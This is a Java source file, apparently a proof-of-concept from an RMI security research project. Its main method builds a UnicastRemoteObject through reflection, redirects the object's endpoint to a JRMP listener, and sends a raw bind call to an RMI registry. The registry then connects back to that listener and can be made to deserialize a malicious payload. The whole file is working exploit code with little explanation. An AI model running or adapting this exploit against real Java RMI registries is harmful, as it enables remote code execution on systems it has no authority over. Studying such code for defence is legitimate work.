package com.dem0.vuln;

import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Constructor;
import java.rmi.server.ObjID;
import java.rmi.server.UnicastRemoteObject;

import static com.dem0.rmi.Main.sendRawCall;
//import static com.dem0.util.Reflections.getFieldValue;
//import static com.dem0.util.Reflections.setFieldValue;
import com.dem0.utils.Reflections;


public class AttackRegistryByJRMPListener {
    public static void main(String[] args) {
        try {
            String registryHost = "127.0.0.1";
            int registryPort = 1099;
            String JRMPHost = "127.0.0.1";
            int JRMPPort = 2499;

            Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
            constructor.setAccessible(true);
            //因为UnicastRemoteObject的默认构造方式是protect的，所以需要反射调用

            UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);
            TCPEndpoint ep = (TCPEndpoint) Reflections.getFieldValue(Reflections.getFieldValue(Reflections.getFieldValue(remoteObject,"ref"),"ref"),"ep");

            //这里直接反射修改对应的值，间接修改构造的序列化数据
            Reflections.setFieldValue(ep,"port",JRMPPort);
            Reflections.setFieldValue(ep,"host",JRMPHost);


            ObjID objID_ = new ObjID(0);

            //Bind("test",payloadObj)
            sendRawCall(registryHost,registryPort,objID_,0,4905912898345647071L,"test",remoteObject);

        }catch (Throwable t){
            t.printStackTrace();
        }
    }

}
